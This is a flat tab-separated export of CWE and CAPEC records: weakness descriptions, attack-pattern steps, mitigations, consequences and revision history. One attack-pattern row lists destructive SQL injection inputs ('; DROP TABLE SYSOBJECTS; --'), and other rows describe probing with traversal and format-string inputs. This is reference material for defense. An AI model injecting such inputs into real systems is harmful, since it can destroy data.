7526	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer                            Forced Path Execution
21128	28	CWE Content Team
22225	62	updated Relationships
24130	39	2018-03-27
6855	50	Identify programs that may be used to acquire process information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.
10065	28	CWE Content Team
18210	69	Draft
12352	66	Delivering Signals for Fun and Profit
21331	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, use anti-CSRF packages such as the OWASP CSRFGuard. [REF-330]                   Another example is the ESAPI Session Management control, which includes a component for CSRF. [REF-45]
9578	28	Eric Dalci
12314	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.                   If a programmer believes that an attacker cannot modify certain inputs, then the programmer might not perform any input validation at all. For example, in web applications, many programmers believe that cookies and hidden form fields can not be modified from a web browser (CWE-472), although they can be altered using a proxy or a custom program. In a client-server architecture, the programmer might assume that client-side security checks cannot be bypassed, even when a custom client could be written that skips those checks (CWE-602).
16227	104	38
19283	31	1000
9690	39	2011-06-01
19155	74	2
16684	73	Cryptanalysis. The attacker uses cryptanalysis to determine if the session IDs contain any cryptographic protections.
13201	21	7 Pernicious Kingdoms
23517	103	Primary
19275	81	Other
9058	35	MITRE
15376	81	Confidentiality
8596	81	Availability
25344	62	updated Related_Attack_Patterns
18819	69	Incomplete
20162	63	Modify Application Data
9842	90	Language-Independent
18246	81	Integrity
18542	62	updated Relationships
9348	101	CAPEC Content Team
24588	23	If elevated access rights are assigned to EJB methods, then an attacker can take advantage of the permissions to exploit the software system.
13087	28	CWE Content Team
6819	91	Architecture and Design
23405	39	2011-06-27
25038	31	1000
23650	76	2019-09-30
19069	35	MITRE
23688	102	ChildOf
15041	28	CWE Content Team
16837	103	Primary
15250	91	Implementation
16039	31	1000
16798	59	Updated Prerequisites
18489	28	CWE Content Team
15889	35	MITRE
10925	81	Availability
5896	35	MITRE
13041	56	ChildOf
18356	50	Implementation: Perform input validation for all remote content, including remote and user-generated content.
20266	35	MITRE
12434	57	Primary
16840	39	2010-06-21
24677	103	Primary
19818	85	279
16646	35	MITRE
24546	35	MITRE
15548	28	CWE Content Team
25382	36	http://www.owasp.org/index.php/Canonicalization,_locale_and_Unicode
12961	79	Access Control
24697	55	CAPEC Content Team
24446	62	updated Name
6093	69	Draft
9522	39	2017-05-03
15805	62	updated Common_Consequences
6845	46	Many communication channels can be "sniffed" by attackers during data transmission. For example, network traffic can often be sniffed by any attacker who has access to a network interface. This significantly lowers the difficulty of exploitation by attackers.
16776	35	MITRE
6535	56	ChildOf
9451	66	boost C++ Library Smart Pointers
19917	47	Execute Unauthorized Commands
6855	23	An adversary adds a new entry to the "run keys" in the registry so that an application of his choosing is executed when a user logs in. In this way, the adversary can get their executable to operate and run on the target system with the authorized user's level of permissions.
16233	103	Primary
19027	35	MITRE
22106	33	Lawrence H. Shafer
17248	39	2011-06-01
18719	92	Exploit
22150	97	Collect Data from Screen Capture
11035	76	2017-01-09
18214	62	updated Common_Consequences
16225	43	Simple
13171	69	Incomplete
22816	72	If the single factor is compromised (e.g. by theft or spoofing), then the integrity of the entire security mechanism can be violated with respect to the user that is identified by that factor.
8340	50	Monitor processes and command-line arguments for unknown behavior related to code injection.
19816	62	updated Relationships, Taxonomy_Mappings
19069	28	CWE Content Team
25396	55	CAPEC Content Team
6939	62	updated Name
12673	63	DoS: Crash, Exit, or Restart
17057	103	Primary
15403	35	Cigital
18480	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
19547	91	Architecture and Design
20240	62	updated Potential_Mitigations, References
24268	28	CWE Content Team
18305	39	2010-09-27
25020	62	updated Relationships
6302	62	updated Description, Name, Relationships
20913	103	Primary
11613	40	None. All applications rely on file paths and therefore, in theory, they or their resources could be affected by this type of attack.
17077	104	391
14333	76	2019-09-30
15279	79	Availability
20834	31	1000
6928	51	2014-06-23
12950	39	2008-07-01
21798	62	updated Demonstrative_Examples, References, Relationships
10803	62	updated Relationships, Taxonomy_Mappings
10260	62	updated Demonstrative_Examples
18604	35	MITRE
5634	69	Draft
9065	103	Primary
21838	28	CWE Content Team
10157	26	Implementation
22823	28	CWE Content Team
6759	76	2017-05-01
17218	104	43
8364	81	Integrity
11621	62	updated References
10785	28	CWE Content Team
10522	62	updated Common_Consequences, Demonstrative_Examples, Description, Name, Potential_Mitigations
20329	62	updated Causal_Nature, Demonstrative_Examples, Likelihood_of_Exploit, References
15065	104	1023
17886	39	2012-05-11
21388	101	CAPEC Content Team
18811	89	Meta
17128	35	MITRE
20966	35	MITRE
19341	28	CWE Content Team
6226	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Host Application Interface Scanner
6270	62	updated Relationships, Taxonomy_Mappings
15698	59	Updated Resources_Required
6862	39	2008-07-01
20783	28	CWE Content Team
10795	104	126
12083	39	2008-07-01
23325	35	MITRE
6888	35	MITRE
9373	79	Confidentiality
8942	40	Null terminators are not properly handled by the filter.
20773	79	Confidentiality
19843	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
21531	28	CWE Content Team
17513	81	Availability
10913	31	1000
16468	35	MITRE
15648	39	2008-09-08
15074	39	2017-11-08
8991	104	784
21844	35	Cigital
5660	76	2017-08-04
25022	47	Modify Data
12418	79	Integrity
23704	62	clarified the description
20473	62	updated Description
13181	39	2019-06-20
7086	35	MITRE
12184	85	464
7367	90	Language-Independent
19829	28	CWE Content Team
14666	28	CWE Content Team
14713	91	Implementation
20678	28	CWE Content Team
20435	39	2017-11-08
13912	85	507
8760	28	Eric Dalci
17449	35	MITRE
7959	79	Authorization
15779	62	updated Applicable_Platforms, Description, Relationships, Observed_Example, Other_Notes, Weakness_Ordinalities
14842	28	CWE Content Team
18642	52	While this weakness might be caught by the compiler in some languages, it can occur more frequently in cases in which the called function accepts variable numbers of arguments, such as format strings in C. It also can occur in loosely typed languages or environments. This might require an understanding of intended program behavior or design to determine whether the value is incorrect.
18394	39	2010-12-13
8660	35	MITRE
10147	39	2008-09-08
6571	62	updated Relationships
20935	53	The MITRE Corporation
17719	35	MITRE
16506	81	Confidentiality
20715	102	ChildOf
24538	50	Use strong access control such as two factor access control for administrative access to the switch
23492	35	MITRE
12644	39	2008-11-24
19341	39	2011-06-01
12206	85	216
16413	28	CWE Content Team
9713	28	CWE Content Team
20805	63	Unexpected State
7451	66	Null Reference Creation and Null Pointer Dereference
24350	31	1000
16350	80	An attacker can try special characters in the URL and bypass the URL validation.
16579	95	[Determine the application's susceptibility to Flash injection] Determine the application's susceptibility to Flash injection. For each URL identified in the explore phase, the attacker attempts to use various techniques such as direct load asfunction, controlled evil page/host, Flash HTML injection, and DOM injection to determine whether the application is susceptible to Flash injection.
13191	26	Implementation
20493	103	Primary
10801	88	Insufficient Use of Symbolic Constants
16518	100	The MITRE Corporation
23154	50	Use browser technologies that do not allow client-side scripting.
19395	46	This incorrect implementation may allow authentication to be bypassed.
17973	54	Low
11795	33	Yuval Yarom
17678	28	CWE Content Team
19639	25	Low
9450	63	Reduce Maintainability
20054	63	Modify Application Data
10340	86	http://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)
22255	62	updated Demonstrative_Examples
7574	79	Confidentiality
14076	26	Operation
21118	28	CWE Content Team
8860	55	CAPEC Content Team
17362	39	2008-09-08
17035	62	updated Related_Attack_Patterns
22450	44	SOAR Partial
15527	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
22761	103	Primary
7255	28	CWE Content Team
24680	28	CWE Content Team
15086	28	CWE Content Team
10226	28	CWE Content Team
12488	39	2012-05-11
6278	33	Microsoft
19079	101	CAPEC Content Team
14706	35	MITRE
9776	28	CWE Content Team
22443	35	Cigital
19286	39	2008-10-14
10769	62	updated Relationships
6885	48	10
11629	62	updated Relationships
24279	56	ChildOf
7623	100	The MITRE Corporation
6980	39	2009-05-27
18972	28	CWE Content Team
5652	53	The MITRE Corporation
18340	73	Attackers can email attack URLs to potential victims through spam and phishing techniques.
15094	31	699
15216	28	CWE Content Team
13178	28	CWE Content Team
22548	40	The target application must include external files. Most non-trivial applications meet this criterion.
6354	26	Implementation
15325	69	Draft
11259	81	Other
6427	39	2009-03-10
11796	90	Language-Independent
9855	76	2019-04-04
16233	31	1000
22786	90	Language-Independent
15826	62	updated Potential_Mitigations
17555	35	MITRE
13995	35	MITRE
14538	81	Confidentiality
20557	101	CAPEC Content Team
7053	57	Resultant
13694	35	MITRE
13578	101	CAPEC Content Team
24548	28	CWE Content Team
9570	35	MITRE
12535	70	OWASP Testing Guide
22061	42	If the program to be executed allows arguments to be specified within an input file or from standard input, then consider using that mode to pass arguments instead of the command line.
7231	46	Typically the system has not given authorization for the transmission and has no knowledge of its occurrence.
15898	88	Deployment of Wrong Handler
12064	39	2012-10-30
12862	28	CWE Content Team
12936	97	Identity Spoofing
8990	39	2009-05-27
25200	35	Cigital
16958	28	CWE Content Team
14767	28	CWE Content Team
8612	40	An application uses an XML parser to perform transformation on user-controllable data.
21825	81	Integrity
14099	39	2010-09-27
6560	31	1000
6700	81	Integrity
9714	76	2017-05-01
14792	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Weaknesses
16283	81	Other
6542	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
19759	26	Implementation
24583	39	2011-06-01
19285	35	MITRE
14840	74	1
12011	39	2017-01-19
12011	62	updated Relationships
9047	35	MITRE
23016	28	CWE Content Team
8443	92	Exploit
8529	88	Use of Platform-Dependent Third Party Components
24309	93	Limited
5795	35	Cigital
16397	62	updated Relationships, Taxonomy_Mappings
16077	28	CWE Content Team
10272	39	2009-05-27
16213	39	2018-03-27
13915	69	Draft
19378	103	Primary
20237	62	updated Relationships, Taxonomy_Mappings
16429	21	PLOVER
13786	28	CWE Content Team
18582	95	[Analysis] The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.
11874	39	2012-05-11
14893	45	Base
9031	63	Unexpected State
21035	35	Cigital
10440	43	Simple
15908	39	2008-11-24
17376	21	CWE Content Team
23760	35	MITRE
7700	39	2011-03-29
8421	24	MITRE
23703	35	KDM Analytics
9993	74	1
13847	39	2009-07-27
5814	45	Base
21642	104	115
5629	57	Primary
11821	52	Since these bugs typically introduce obviously incorrect behavior, they are found quickly, unless they occur in rarely-tested code paths. Managing the correct number of arguments can be made more difficult in cases where format strings are used, or when variable numbers of arguments are supported.
17215	35	MITRE
18246	81	Access Control
13328	62	updated Related_Attack_Patterns
10746	35	MITRE
24505	56	ChildOf
19395	104	303
8596	72	The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.
12664	81	Other
22828	28	CWE Content Team
11134	23	The software contains a class with inheritance from more than      one concrete class.
11366	28	CWE Content Team
23239	54	High
13719	39	2011-06-01
21214	53	The MITRE Corporation
18704	74	2
23577	35	MITRE
21410	31	699
17372	39	2011-06-01
21990	35	MITRE
19725	86	https://en.wikipedia.org/wiki/Halstead_complexity_measures
7058	62	updated Time_of_Introduction
7059	28	CWE Content Team
12249	39	2014-07-30
18178	62	updated Demonstrative_Examples
13500	35	MITRE
15351	101	CAPEC Content Team
21596	26	Implementation
8142	35	MITRE
8093	39	2012-05-11
12978	50	Use safe libraries when creating temporary files. For instance the standard library function mkstemp can be used to safely create temporary files. For shell scripts, the system utility mktemp does the same thing.
9296	62	Suggested OWASP Top Ten mapping
21431	47	Hide Activities
7427	63	Other
17843	35	MITRE
8759	42	Do not use Synchronization Primitives when writing EJBs.
21216	35	MITRE
23305	56	ChildOf
16722	53	The MITRE Corporation
16615	51	2014-06-23
24119	62	updated Time_of_Introduction
15841	74	3
24312	62	updated Applicable_Platforms
21585	39	2009-03-10
25284	56	ChildOf
14363	28	CWE Content Team
15798	28	CWE Content Team
19860	43	Simple
7624	102	ChildOf
11986	39	2011-03-29
5609	39	2010-06-21
21609	39	2014-07-30
12607	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
11954	28	CWE Content Team
8988	31	1000
15828	28	CWE Content Team
23530	35	MITRE
17439	28	CWE Content Team
10818	62	updated Modes_of_Introduction, Relationships, Taxonomy_Mappings
22438	28	CWE Content Team
8167	28	Eric Dalci
18449	39	2017-11-08
16672	39	2010-12-13
25237	39	2019-06-20
11129	28	CWE Content Team
13367	31	1000
8186	35	Cigital
21551	69	Draft
22384	28	CWE Content Team
15428	33	John McDonald
23444	23	The server contains a protection mechanism that assumes that any URI that is accessed using HTTP GET will not cause a state change to the associated resource. This might allow attackers to bypass intended access restrictions and conduct resource modification and deletion attacks, since some applications allow GET to modify state.
17605	45	Variant
8379	86	http://www.omg.org/spec/ASCSM/1.0/
6902	63	Gain Privileges or Assume Identity
22644	28	CWE Content Team
9074	35	MITRE
8473	39	2011-06-01
19718	91	Implementation
12119	62	updated Modes_of_Introduction, Relationships, Taxonomy_Mappings, Time_of_Introduction
23465	90	Java
7715	28	CWE Content Team
5995	26	Implementation
20260	31	699
21413	51	2015-11-09
8433	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
10013	62	updated Applicable_Platforms, Detection_Factors, References, Relationships, Taxonomy_Mappings
6136	35	MITRE
11334	62	updated Other_Notes, Potential_Mitigations, Research_Gaps
16320	39	2012-10-30
11049	59	Updated Related_Attack_Patterns
12952	35	MITRE
8830	72	Making a critical variable public allows anyone with access to the object in which the variable is contained to alter or read the value.
8002	92	Explore
9891	30	D. Page
13002	62	updated Common_Consequences
14251	46	Access control involves the use of several protection mechanisms such as:                             Authentication (proving the identity of an actor)                Authorization (ensuring that a given actor can access a resource), and                Accountability (tracking of activities that were performed)                          When any mechanism is not applied or otherwise fails, attackers can compromise the security of the software by gaining privileges, reading sensitive information, executing commands, evading detection, etc.             There are two distinct behaviors that can introduce access control weaknesses:                                                Specification: incorrect privileges, permissions, ownership, etc. are explicitly specified for either the user or the resource (for example, setting a password file to be world-writable, or giving administrator capabilities to a guest user). This action could be performed by the program or the administrator.                   Enforcement: the mechanism contains errors that prevent it from properly enforcing the specified access control requirements (e.g., allowing the user to specify their own privileges, or allowing a syntactically-incorrect ACL to produce insecure settings). This problem occurs within the program itself, in that it does not actually enforce the intended security policy that the administrator specifies.
8827	63	DoS: Instability
9960	91	Implementation
20564	76	2019-04-04
18172	63	Modify Application Data
23193	28	CWE Content Team
18924	91	Implementation
12018	28	CWE Content Team
14005	80	The attacker must have fairly detailed knowledge of the syntax and semantics of client/server communications protocols and grammars
22695	23	In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient. Sniffing Attacks are similar to Man-In-The-Middle attacks (CAPEC-94), but are entirely passive. MITM attacks are predominantly active and often alter the content of the communications themselves.
21601	59	Updated Related_Weaknesses
5855	39	2008-07-01
22150	54	Medium
16880	26	Architecture and Design
17840	62	updated Relationships, Other_Notes
10025	23	A software system that accepts path input in the form of trailing backslash ('filedir\') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
8748	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
11942	43	Simple
11837	56	ChildOf
22611	31	699
9351	35	MITRE
23262	94	A successful attack of this kind can identify open ports and available services on a system.
16422	85	173
23934	27	None: No specialized resources are required to execute this type of attack.
9477	95	The attacker probes the application for information. Which version of the application is running? Are there known environment variables? etc.
18164	101	CAPEC Content Team
23764	39	2011-06-27
8074	35	MITRE
13899	42	If METHOD_NEITHER is required for the IOCTL, then ensure that all user-space addresses are properly validated before they are first accessed. The ProbeForRead and ProbeForWrite routines are available for this task. Also properly protect and manage the user-supplied buffers, since the I/O Manager does not do this when METHOD_NEITHER is being used. See References.
14139	44	SOAR Partial
16885	73	Determine logging utility being used by application web server (e.g. log4j), only possible if the application is known by the attacker or if the application returns error messages with logging utility information.
12098	62	updated Relationships
12006	28	CWE Content Team
9974	73	Use an automated tool to record all instances of URLs to process XML requests.
6856	62	updated Observed_Examples, References, Relationships
10260	39	2011-03-29
17732	46	When a new process is forked or executed, the child process inherits any open file descriptors. When the child process has fewer privileges than the parent process, this might introduce a vulnerability if the child process can access the file descriptor but does not have the privileges to access the associated file.
16428	35	Cigital
17388	45	Base
18681	35	MITRE
17199	62	updated Potential_Mitigations
8953	56	ChildOf
24562	62	updated Relationships, Taxonomy_Mappings
5994	28	CWE Content Team
11613	27	None: No specialized resources are required to execute this type of attack.
11447	45	Base
22229	28	CWE Content Team
9930	55	CAPEC Content Team
15313	39	2008-07-01
12328	69	Incomplete
17803	40	The communication occurs in clear (not encrypted) or with insufficient and spoofable encryption.
25415	101	CAPEC Content Team
9877	77	Automated Static Analysis
12905	79	Authorization
21139	43	Simple
8002	74	1
13715	56	ChildOf
20890	51	2014-06-23
8145	46	The use of a singleton pattern may not be thread-safe.
20304	31	1000
22989	62	updated Common_Consequences
19646	62	updated Relationships
24918	55	CAPEC Content Team
10656	28	CWE Content Team
8350	40	The target must use the affected file without verifying its integrity.
15072	39	2012-10-30
11506	49	2005
10415	28	CWE Content Team
10108	39	2014-06-23
19097	62	updated Potential_Mitigations
16820	36	http://www.owasp.org/index.php/Testing_for_ORM_Injection
19814	62	updated Related_Attack_Patterns
12075	81	Other
12811	78	High
16449	73	If a denial of service attack is the goal, try stacking queries. This does not work on all platforms (most notably, it does not work on Oracle or MySQL). Examples of inputs to try include: "'; DROP TABLE SYSOBJECTS; --" and "'); DROP TABLE SYSOBJECTS; --". These particular queries will likely not work because the SYSOBJECTS table is generally protected.
12392	104	394
17990	35	MITRE
17482	60	13
15903	43	Simple
11825	47	Unreliable Execution
16348	63	DoS: Resource Consumption (CPU)
23539	28	CWE Content Team
15641	70	Multiple vendors XML parser (and SOAP/WebServices server) Denial of Service attack using DTD
13195	39	2009-03-10
22695	97	Sniffing Attacks
17275	63	Hide Activities
15218	43	Simple
18645	62	updated Common_Consequences
23876	63	DoS: Crash, Exit, or Restart
23923	39	2008-11-24
19381	56	ChildOf
9934	85	522
11008	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Host Application Interface Scanner                            Fuzz Tester                            Framework-based Fuzzer
6488	91	Architecture and Design
6872	45	Class
21310	104	207
16985	62	updated Related_Attack_Patterns
10755	60	23
13208	35	MITRE
24490	71	2009
16640	35	MITRE
21761	56	ChildOf
17535	79	Availability
16058	28	CWE Content Team
6403	35	MITRE
17584	62	updated Related_Attack_Patterns
20397	39	2009-03-10
6663	35	MITRE
14406	103	Primary
8202	28	CWE Content Team
19541	55	CAPEC Content Team
13127	31	1000
14382	31	699
7959	94	Run Arbitrary Code
11961	56	ChildOf
20233	62	updated Relationships
23718	56	ChildOf
21136	95	The first step is exploratory meaning the attacker looks for an integer variable that he can control.
19276	39	2011-06-27
9692	101	CAPEC Content Team
11543	28	CWE Content Team
13543	60	16
22388	62	updated Description, Name
16875	31	699
17727	81	Other
20816	62	updated Relationships
10384	50	Authenticate request to every resource. In addition, every page or resource must ensure that the request it is handling has been made in an authorized context.
17337	66	Should we really use bcrypt/scrypt?
7893	39	2008-07-01
11093	28	CWE Content Team
24481	39	2008-09-08
11316	57	Primary
15983	62	updated Relationships
19015	35	MITRE
22242	31	699
18697	76	2017-05-01
10313	28	CWE Content Team
22386	39	2008-07-01
6001	40	The adversary must have the ability to access the target mail application.
15593	62	updated Common_Consequences
17185	46	Some functions that offer security features supported by the OS are not available on all versions of the OS in common use. Likewise, functions are often deprecated or made obsolete for security reasons and should not be used.
7136	35	MITRE
24518	103	Primary
9741	62	updated Affected_Resources, Applicable_Platforms, Modes_of_Introduction, Relationships
18098	62	updated Relationships
6850	102	ChildOf
13077	39	2012-05-11
10551	88	Asymmetric Resource Consumption (Amplification)
24932	91	Architecture and Design
10537	62	updated Relationships
6497	26	Operation
12592	31	1000
6746	63	Bypass Protection Mechanism
22045	35	MITRE
22847	35	MITRE
22801	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
24826	62	updated Time_of_Introduction
25433	81	Confidentiality
17780	62	updated Relationships
8495	62	updated Potential_Mitigations, Time_of_Introduction
21772	42	Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.                   OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.                   This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.                   Be careful to avoid CWE-243 and other weaknesses related to jails.
18158	48	02
13275	35	MITRE
6885	86	http://www.openwall.com/presentations/YaC2012-Password-Hashing-At-Scale/
18934	99	SANS Software Security Institute
14477	28	CWE Content Team
15279	79	Confidentiality
11470	39	2011-06-01
24771	55	CAPEC Content Team
9696	39	2014-07-30
22699	39	2011-03-29
14533	28	CWE Content Team
20943	23	An adversary sends a UDP datagram having an assigned value to its internet identification field (ID) to a closed port on a target to observe the manner in which this bit is echoed back in the ICMP error message. The internet identification field (ID) is typically utilized for reassembling a fragmented packet. RFC791 and RFC815 discusses about IP datagrams, fragmentation and reassembly. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within the ICMP error message. There are three behaviors related to the IP ID field that can be used to distinguish remote operating systems or firmware: 1) it is echoed back identically to the bit order of the ID field in the original IP header, 2) it is echoed back, but the byte order has been reversed, or it contains an incorrect or unexpected value. Different operating systems will respond by setting the IP ID field differently within error messaging. This allows the attacker to construct a fingerprint of specific OS behaviors.
17640	35	MITRE
10563	39	2017-11-08
15265	35	MITRE
18066	88	Improper Control of a Resource Through its Lifetime
14673	35	MITRE
13723	95	[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).
23266	101	CAPEC Content Team
24701	35	MITRE
22821	30	Mathieu Cunche
16814	63	Varies by Context
7793	28	CWE Content Team
6824	35	MITRE
15870	77	Dynamic Analysis with Manual Results Interpretation
22183	43	Simple
21704	59	Updated Related_Weaknesses
25226	91	Architecture and Design
13647	35	MITRE
11244	35	MITRE
11504	100	The MITRE Corporation
10931	55	CAPEC Content Team
13123	84	12
22949	28	CWE Content Team
10947	69	Incomplete
19609	39	2017-11-08
5865	61	Draft
18309	62	updated Relationships, Taxonomy_Mappings
23682	105	Web Based
8321	62	updated Description
13496	28	CWE Content Team
21732	91	Architecture and Design
14545	35	MITRE
9798	31	699
20219	28	CWE Content Team
17832	79	Confidentiality
10556	40	The adversary must have the means and knowledge of how to communicate with the target in some manner.
8074	62	updated Relationships, Taxonomy_Mappings
6686	39	2008-09-08
22539	91	Architecture and Design
6428	79	Authorization
21590	90	C
9938	35	MITRE
10604	62	updated Description
19464	23	An attacker exploits a sample, demonstration, or test API that is insecure by default and should not be resident on production systems. Some applications include APIs that are intended to allow an administrator to test and refine their domain. These APIs should usually be disabled once a system enters a production environment. Testing APIs may expose a great deal of diagnostic information intended to aid an administrator, but which can also be used by an attacker to further refine their attack. Moreover, testing APIs may not have adequate security controls or may not have undergone rigorous testing since they were not intended for use in production environments. As such, they may have many flaws and vulnerabilities that would allow an attacker to severely disrupt a target.
11156	47	Bypass Protection Mechanism
22664	74	1
10690	46	Storing a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resource, making it an easy target for attackers.
15512	28	CWE Content Team
22483	28	CWE Content Team
7067	39	2008-08-01
12482	45	Class
24638	62	updated Common_Consequences
8776	23	The software does not fully clear previously used information in a data structure, file, or other resource, before making that resource available to a party in another control sphere.
10039	81	Confidentiality
23964	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
6605	103	Primary
23585	28	CWE Content Team
13303	47	Read Data
17315	104	144
23470	104	1039
15976	62	updated Relationships, Taxonomy_Mappings
24160	62	updated Potential_Mitigations
16152	39	2011-06-01
9375	39	2011-06-01
11132	28	CWE Content Team
24391	28	CWE Content Team
24726	90	Java
13177	62	Improved the White_Box_Definition
13044	39	2008-09-08
6819	42	If you cannot perform operations atomically and you must share access to the resource between multiple processes or threads, then try to limit the amount of time (CPU cycles) between the check and use of the resource. This will not fix the problem, but it could make it more difficult for an attack to succeed.
18262	62	updated Applicable_Platforms
7198	28	CWE Content Team
22851	69	Draft
19767	91	Implementation
8462	31	699
18976	50	Obfuscate network traffic through encryption to prevent its readability by network sniffers.
10220	28	CWE Content Team
7796	79	Access Control
21616	28	CWE Content Team
13632	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   Speficially, it may be helpful to use tools or frameworks to perform integrity checking on the transmitted code.                                                                  When providing the code that is to be downloaded, such as for automatic updates of the software, then use cryptographic signatures for the code and modify the download clients to verify the signatures. Ensure that the implementation does not contain CWE-295, CWE-320, CWE-347, and related weaknesses.                         Use code signing technologies such as Authenticode. See references [REF-454] [REF-455] [REF-456].
20825	35	MITRE
10521	80	To achieve a redirection and use of less trusted source, an adversary can simply edit content such as XML payload or HTML files that are sent to client machine.
21696	91	Implementation
6840	28	CWE Content Team
18714	28	CWE Content Team
8139	24	MITRE
8448	28	CWE Content Team
17313	62	updated Potential_Mitigations
22784	39	2009-07-27
17488	73	Insert various formatting characters to read or write the memory, e.g. overwrite return address, etc.
23248	40	The adversary must have previously installed the malicious application that will run in place of the trusted activity.
17876	62	updated Description
15047	35	Cigital
20046	24	MITRE
25190	76	2017-05-01
6835	35	MITRE
7095	39	2014-06-23
16343	24	MITRE
13525	35	MITRE
17453	39	2011-06-27
16394	28	CWE Content Team
15703	100	The MITRE Corporation
18598	31	1000
8817	56	ChildOf
9252	103	Primary
15141	81	Confidentiality
20621	39	2008-07-01
20012	73	Use a list of probe strings as path traversal payload. Different strings may be used for different platforms. Strings contain relative path sequences such as "../".
25195	66	Suhosin
23213	39	2009-01-12
14751	28	CWE Content Team
21081	28	CWE Content Team
20425	91	System Configuration
7897	59	Updated Related_Attack_Patterns
13881	56	ChildOf
17150	100	The MITRE Corporation
13411	39	2012-05-11
11555	39	2017-11-08
15305	91	Implementation
19930	100	The MITRE Corporation
22219	79	Non-Repudiation
21327	81	Other
23759	28	CWE Content Team
13404	100	The MITRE Corporation
23263	40	The target must accept service requests from the attacker and the adversary must be able to control the resource allocation associated with this request to be in excess of the normal allocation. The latter is usually accomplished through the presence of a bug on the target that allows the adversary to manipulate variables used in the allocation.
21760	81	Availability
22718	30	Frank Coyle
8856	39	2019-01-03
21618	33	Scott Mitchell
24122	88	XML Injection (aka Blind XPath Injection)
20519	49	2011
7770	85	496
21725	66	Analyzing Inter-Application Communication in Android
13701	45	Variant
14105	31	700
24339	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as substitution characters when they are sent to a downstream component.
22552	39	2014-07-30
16901	35	MITRE
20246	35	MITRE
8068	28	CWE Content Team
18182	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
24640	28	Eric Dalci
17481	31	1000
21517	23	The product's design documentation does not adequately describe      control flow, data flow, system initialization, relationships between tasks,      components, rationales, or other important aspects of the      design.
7808	81	Integrity
9454	97	Manipulating Writeable Terminal Devices
12444	76	2019-04-04
11057	31	699
7257	62	updated Relationships
8679	39	2011-06-01
24168	76	2019-04-04
18009	39	2011-06-01
22332	62	updated Relationships
15903	45	Variant
17679	39	2011-06-01
19415	35	MITRE
21577	35	Veracode
8612	50	Perform validation on canonical data.
13879	72	As passwords age, the probability that they are compromised grows.
18348	26	Architecture and Design
9691	43	Simple
24962	101	CAPEC Content Team
16567	35	MITRE
10903	35	MITRE
14107	88	Improper Ownership Management
8966	27	The ability to send custom ICMP queries. This can be accomplished via the use of various scanners or utilities.
6243	28	CWE Content Team
7999	47	Execute Unauthorized Commands
7021	28	CWE Content Team
13842	45	Base
10144	50	Implementation: Restrict the permission to modify the entries in the configuration file.
7491	56	CanPrecede
14176	53	The MITRE Corporation
21059	62	updated Taxonomy_Mappings
10725	103	Primary
19145	72	If the untrusted pointer is used in a read operation, an attacker might be able to read sensitive portions of memory.
15826	35	MITRE
25006	72	Generally this error will cause the data structure to not work properly by truncating the data.
16736	91	Architecture and Design
21090	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
18611	62	updated Observed_Examples
22731	39	2018-03-27
18706	31	699
21512	81	Confidentiality
20431	91	Architecture and Design
12560	79	Integrity
11965	102	ChildOf
19602	33	Johannes Ullrich
9507	103	Primary
24389	45	Class
8879	25	High
7372	28	Eric Dalci
6242	39	2010-04-05
9603	62	updated Relationships
16342	76	2019-04-04
25004	69	Stable
18925	28	Eric Dalci
8903	35	MITRE
7209	76	2018-07-31
20987	35	MITRE
14050	28	CWE Content Team
25242	95	[Determine applicability] The attacker determines whether server side includes are enabled on the target web server.
13120	35	MITRE
11352	28	CWE Content Team
10206	81	Confidentiality
24763	28	CWE Content Team
15875	61	Draft
20990	92	Experiment
